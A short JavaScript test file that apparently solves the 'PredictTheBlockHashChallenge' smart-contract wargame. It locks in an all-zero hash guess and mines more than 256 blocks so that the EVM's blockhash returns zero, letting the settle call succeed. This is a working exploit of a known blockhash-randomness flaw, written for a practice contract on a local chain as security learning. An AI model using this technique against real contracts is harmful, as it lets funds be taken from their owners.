const { expect } = require("chai");
const { buildContract } = require("../utils");

it("Solves PredictTheBlockHashChallenge", async function () {
  const contract = await buildContract("PredictTheBlockHashChallenge", ethers.parseEther("1.0"));

  const guess = "0x" + "0".repeat(64);
  await contract.lockInGuess(guess, {
    value: ethers.parseEther("1.0")
  });

  // EVM only saves most recent 256 blockhashes, and returns 0 for older ones.
  const provider = ethers.provider;
  while (await provider.getBlockNumber() < 300) {
    // Manually mine new blocks.
    await provider.send("evm_mine");
  }

  await contract.settle();
  expect(await contract.isComplete()).to.equal(true);
});
